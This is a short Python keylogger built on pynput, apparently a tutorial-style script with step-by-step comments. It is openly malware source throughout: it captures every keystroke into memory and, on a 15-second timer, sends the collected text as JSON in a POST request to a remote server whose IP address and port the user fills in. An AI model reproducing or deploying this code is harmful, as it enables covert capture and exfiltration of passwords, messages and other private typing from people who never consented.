# Import the mouse and keynboard from pynput
from pynput import keyboard
import requests
import json
import threading

# This is a global variable that will save a string of the keystrokes which we'll send to the server.
text = ""

# Hard code the values of your server and ip address here.
ip_address = ""
port_number = ""
# Time interval in seconds for code to execute.
time_interval = 15

def send_post_req():
    try:
        # In order to send the python file to server we need to convert it into a JSON string.
        payload = json.dumps({"keyboardData" : text})
        # Once done we send a POST reqquest to the server with IP address and port number we specify.Also as the file is JSON format we have specified it .
        r = requests.post(f"http://{ip_address}:{port_number}", data=payload, headers={"Content-Type" : "application/json"})
        #  We set a timer function which will keep on iterating every 15 seconds as mentioned earlier .
        timer = threading.Timer(time_interval, send_post_req)
        # We start the timer.
        timer.start()
    except:
        print("Couldn't complete request!")

# We only need to log the key once it is released. That way it takes the modifier keys into consideration.
def on_press(key):
    global text
    if key == keyboard.Key.enter:
        text += "\n"
    elif key == keyboard.Key.tab:
        text += "\t"
    elif key == keyboard.Key.space:
        text += " "
    elif key == keyboard.Key.shift:
        pass
    elif key == keyboard.Key.backspace and len(text) == 0:
        pass
    elif key == keyboard.Key.backspace and len(text) > 0:
        text = text[:-1]
    elif key == keyboard.Key.ctrl_l or key == keyboard.Key.ctrl_r:
        pass
    elif key == keyboard.Key.esc:
        return False
    else:
        # We do an explicit conversion from the key object to a string and then append that to the string held in memory.
        text += str(key).strip("'")
with keyboard.Listener(
    on_press=on_press) as listener:
    send_post_req()
    listener.join()
